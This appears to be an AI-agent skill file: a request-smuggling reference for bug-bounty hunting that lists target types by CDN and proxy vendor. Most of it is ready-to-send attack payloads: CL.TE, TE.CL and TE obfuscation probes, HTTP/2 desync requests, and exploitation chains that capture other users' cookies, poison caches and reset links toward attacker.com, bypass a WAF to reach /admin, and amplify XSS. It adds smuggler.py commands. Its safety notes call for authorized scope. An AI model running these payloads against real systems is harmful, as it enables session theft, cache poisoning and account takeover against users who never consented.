---
name: request-smuggling
description: "HTTP request smuggling hunting — CL.TE, TE.CL, TE.TE obfuscation, H2.CL/H2.TE desync, CL.0, client-side desync, response queue poisoning. Use when testing targets behind reverse proxies, CDNs, load balancers, or any HTTP/2 downgrade scenario."
---

# Request Smuggling Chains — Full Reference

> On-demand knowledge file for `/test-smuggling`. Detailed techniques, CDN behaviors, exploitation chains.

## Crown Jewel Targets

- **Enterprise apps behind CDN + origin** (Cloudflare/Akamai → nginx/Apache → app) — H2 desync through CDN downgrade to HTTP/1.1 (Critical, affects all users)
- **AWS ALB + custom backend** — historical CL.TE vulnerabilities, H2.CL still viable on misconfigured targets
- **HAProxy + legacy backends** — older HAProxy versions with CL.TE desync, chunked handling issues
- **nginx reverse proxy + Node.js** — `proxy_pass` chunked handling differences, CL.0 attacks
- **SaaS platforms with shared hosting** — smuggled requests can steal other tenants' sessions
- **WAF-protected admin panels** — smuggle requests past WAF inspection to reach restricted endpoints
- **Applications with cacheable static assets** — cache poisoning via smuggled Host header → persistent XSS at scale

## Attack Surface Signals

- **Response headers**: `Via:`, `X-Forwarded-For`, `Server: nginx`, `Server: Apache`, CDN headers (CF-RAY, X-Amz-Cf-Id, Akamai-*), `Transfer-Encoding` handling differences
- **URL patterns**: Any endpoint behind reverse proxy (almost all production targets)
- **Tech stack signals**: Dual-server architectures (CDN/LB → origin), HTTP/2 enabled (`:authority` pseudo-header), mixed HTTP versions
- **Detection signals**: Timeout on second request (TE.CL), unexpected response on second request (CL.TE), different server headers in error vs normal responses
- **Positive indicators**: `Transfer-Encoding: chunked` accepted, HTTP/2 ALPN negotiated, multiple `Server` headers in different responses

## Theory

HTTP request smuggling exploits disagreements between front-end (reverse proxy/CDN) and back-end servers about where one request ends and another begins.

**Two key headers:**
- `Content-Length` (CL): body length in bytes
- `Transfer-Encoding: chunked` (TE): body sent in chunks, terminated by `0\r\n\r\n`

When front-end and back-end disagree on which header to use → attacker controls where the "next" request starts.

---

## Detection Techniques

### CL.TE (Front=CL, Back=TE)
```
POST / HTTP/1.1\r\n
Host: TARGET\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
X
```
- Front-end reads CL=6 → sends `0\r\n\r\nX` to back-end
- Back-end reads chunked → processes `0\r\n\r\n` (end) → `X` is left in buffer
- `X` prepends to NEXT request → smuggled

**Confirm:** Send twice. If second request gets unexpected response (405, different content) → CL.TE confirmed.

### TE.CL (Front=TE, Back=CL)
```
POST / HTTP/1.1\r\n
Host: TARGET\r\n
Content-Length: 3\r\n
Transfer-Encoding: chunked\r\n
\r\n
8\r\n
SMUGGLED\r\n
0\r\n
\r\n
```
- Front-end reads chunked → sends everything
- Back-end reads CL=3 → only reads `8\r\n` → `SMUGGLED\r\n0\r\n\r\n` left in buffer

**Confirm:** Timeout on follow-up request = TE.CL confirmed.

### TE.TE (Obfuscation — both support TE, but process differently)

One server ignores malformed TE header, falls back to CL:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked        (space before colon)
Transfer-Encoding: chunked
Transfer-encoding: x               (duplicate, different case)
Transfer-Encoding:
 chunked                            (line-folded)
Transfer-Encoding: "chunked"       (quoted)
Transfer-Encoding: chunked; x=1    (parameter)
X: x\r\nTransfer-Encoding: chunked (header injection)
Transfer-Encoding\t: chunked       (tab before colon)
[space]Transfer-Encoding: chunked  (leading space)
```

Test each variant — find which makes one server ignore TE.

---

## HTTP/2 Smuggling (H2 Desync)

### H2.CL — HTTP/2 front-end → HTTP/1.1 back-end downgrade
```
:method: POST
:path: /
:authority: TARGET
content-length: 0

SMUGGLED REQUEST HERE
```
- HTTP/2 doesn't use CL for framing (uses stream frames)
- But downgrade proxy may add/trust CL header
- Back-end sees CL=0 → body becomes next request

### H2.TE
```
:method: POST
:path: /
transfer-encoding: chunked

0\r\n
\r\n
SMUGGLED REQUEST
```

### H2.0 (header injection via HTTP/2 pseudo-headers)
- Inject `\r\n` in header values (some H2 implementations don't validate)
- `foo: bar\r\nTransfer-Encoding: chunked`

**Tool:** Use Burp HTTP/2 editor — toggle "Allow HTTP/2 ALPN override"

---

## CDN/Proxy-Specific Behaviors

| CDN/Proxy | CL.TE | TE.CL | H2 Downgrade | Notes |
|-----------|-------|-------|---------------|-------|
| **Cloudflare** | Patched | Patched | Test H2.CL | Aggressive normalization, but edge cases exist |
| **Akamai** | Rare | Possible | H2.CL viable | Check with TE obfuscation variants |
| **AWS ALB** | CL.TE known | — | H2.CL | Historical CVEs (2019-2020), may resurface on misconfigured targets |
| **AWS CloudFront** | — | — | H2 desync | CloudFront → custom origin |
| **nginx** | Depends on config | Depends | Proxy_pass issues | `proxy_pass` + chunked can desync |
| **HAProxy** | CL.TE possible | — | — | Older versions vulnerable |
| **IIS + ARR** | TE.CL | — | — | ARR (Application Request Routing) |
| **Apache Traffic Server** | CL.TE | TE.CL | — | Historical issues |
| **Varnish** | — | TE.CL | — | Check chunked handling |

---

## Exploitation Chains

### 1. Steal Other Users' Requests (Session Hijack)
```
POST / HTTP/1.1
Host: TARGET
Content-Length: 130
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: TARGET
Content-Length: 500
Content-Type: application/x-www-form-urlencoded

data=
```
Next user's request (with cookies) gets appended to `data=` → logged/reflected.

### 2. Cache Poisoning
```
POST / HTTP/1.1
Host: TARGET
Content-Length: XX
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: attacker.com
```
Cache stores attacker-controlled response for `/static/main.js` → served to all users.

### 3. WAF Bypass
```
POST /search HTTP/1.1
Content-Length: XX
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
```
WAF inspects outer request (`/search` = allowed) → smuggled request reaches `/admin` uninspected.

### 4. Reflected XSS Amplification
```
POST / HTTP/1.1
Content-Length: XX
Transfer-Encoding: chunked

0

GET /page?q=<script>alert(1)</script> HTTP/1.1
Host: TARGET
```
Smuggled XSS reflected in response served to next user → stored-XSS-like impact.

### 5. Open Redirect → Account Takeover
```
POST / HTTP/1.1
Content-Length: XX
Transfer-Encoding: chunked

0

GET /login HTTP/1.1
Host: TARGET
X-Forwarded-Host: attacker.com
```
Password reset/OAuth redirect poisoned → credentials sent to attacker.

---

## Detection via Timing

### Differential timing (safe, non-destructive)
1. Send CL.TE probe → measure response time
2. Send TE.CL probe → measure response time
3. If one takes significantly longer (~5-10s timeout) → that variant is processed differently

### Burp Scanner
- Burp Suite Pro: Scanner → HTTP Request Smuggling audit
- Scan type: "HTTP request smuggling" → automated detection

### smuggler.py (tool)
```bash
python3 smuggler.py -u https://TARGET/ -m CL-TE
python3 smuggler.py -u https://TARGET/ -m TE-CL
```

---

## Safety Notes

- **ALWAYS test on isolated sessions** — smuggling affects OTHER users' requests
- **Use timing-based detection first** — confirms vulnerability without exploitation
- **Coordinate with program** if you plan exploitation (cache poisoning = high impact on production)
- **Document carefully** — include full request/response pairs in Burp Repeater
- **Never poison caches on production** unless explicitly authorized

## PortSwigger Academy — Advanced Techniques

- **TE obfuscation variants (TE.TE)**: `Transfer-Encoding: xchunked`, space before colon, tab, leading space, newline injection
- **H2.CL attack**: Inject `Content-Length: 0` in HTTP/2 — body treated as next request
- **H2.TE attack**: Inject `Transfer-Encoding: chunked` in HTTP/2 — spec says strip, but if not...
- **CRLF injection in HTTP/2 headers**: `\r\n` in H2 header value → becomes header separator after H1 downgrade
- **HTTP/2 request splitting**: `foo: bar\r\nHost: target\r\n\r\nGET /admin HTTP/1.1` — split via headers
- **Response queue poisoning**: Smuggle COMPLETE second request → desync response queue → next user gets wrong response
- **CL.0 attack**: Backend ignores CL entirely — body becomes next request, no malformed headers needed
- **Client-side desync (CSD)**: `fetch()` with `keepalive:true` poisons victim's own connection
- **Pause-based desync**: Pause mid-request → server forwards partial data

## Advanced smuggling vectors

**Revealing front-end request rewriting.** Before crafting an exploit, learn what the front end adds — it commonly injects headers the back end trusts (client IP, TLS state, an internal auth header). Smuggle a request whose body captures the rewritten version of a following request into a field you can read back (a search parameter is ideal). Whatever the front end appended will appear in the reflected output, and it usually names the header that grants trust.

**Ambiguous host and path over HTTP/2.** When a front end downgrades HTTP/2 to HTTP/1.1, pseudo-headers become real headers, so supplying both `:authority` and a `Host` header — or a path containing a space or CRLF — produces two different views of where the request should go. The same applies to injecting a full request line or a URL prefix through a pseudo-header value. This is the HTTP/2-exclusive class and it works on targets that are immune to CL.TE/TE.CL entirely.

**Hidden HTTP/2 support.** A site that appears to speak only HTTP/1.1 may still support HTTP/2 over cleartext or without ALPN advertising it. Force it (`--http2`, `--http2-prior-knowledge`) before concluding H2 vectors do not apply — hidden support is a common reason a target looks unexploitable.

**Request tunnelling.** Where a connection is not reused between users, you cannot poison someone else's request, but you can still tunnel your own second request past the front end. Blind tunnelling confirms the desync; using `HEAD` makes it non-blind, because the front end applies the `Content-Length` of the HEAD response to the tunnelled body and lets you read it. Useful for leaking internal headers the front end adds.

**0.CL and CL.0.** In `CL.0` the front end honours `Content-Length` and the back end ignores it (treating the body as a new request); `0.CL` is the inverse. Both are reachable on endpoints where the back end never expects a body — static files, redirects, and error paths are the usual candidates. Test them explicitly, because a target immune to classic CL.TE frequently is not immune to these.

## Operator Notes (Battle-Tested)

1. **Use timing-based detection first, always**: Send CL.TE and TE.CL probes and measure response time. A 5-10s delay on one variant confirms the desync type without affecting other users. Never jump to exploitation on production.
2. **Burp Suite Pro scanner handles detection well**: Run the "HTTP request smuggling" scan item — it tests all variants including TE obfuscation and H2 desync. Follow up manually with Burp Repeater using HTTP/2 editor for H2 attacks.
3. **TE obfuscation is where most findings hide**: Standard CL.TE/TE.CL are well-patched now. Try every variant: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked` (space before colon), `Transfer-Encoding\t: chunked` (tab), line-folded, quoted, parameterized. One of these will make one server ignore TE.
4. **Coordinate with program before cache poisoning**: Poisoning production caches affects real users. Demonstrate the desync with timing + reflected content, then explain the cache poisoning impact theoretically. Only poison if explicitly authorized.
5. **H2 desync (HTTP/2 → HTTP/1.1 downgrade) is the current frontier**: Most CDNs negotiate HTTP/2 but downgrade to HTTP/1.1 for the origin. Inject CL or TE headers in HTTP/2 frames — the downgrade proxy may forward them verbatim.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Smuggling enables cache poisoning | `cache-poisoning` |
| Smuggling bypasses WAF to reach admin | `access-control-testing`, `waf-bypass` → `references/waf-generic-evasion.md` |
| Need to identify reverse proxy architecture | `origin-ip-discovery` |
| Smuggling + Host header injection | `host-header-attacks` |
| Path confusion between proxy and backend | `server-confusion-attacks` |
| Client-side desync via fetch() | `xss-testing` |
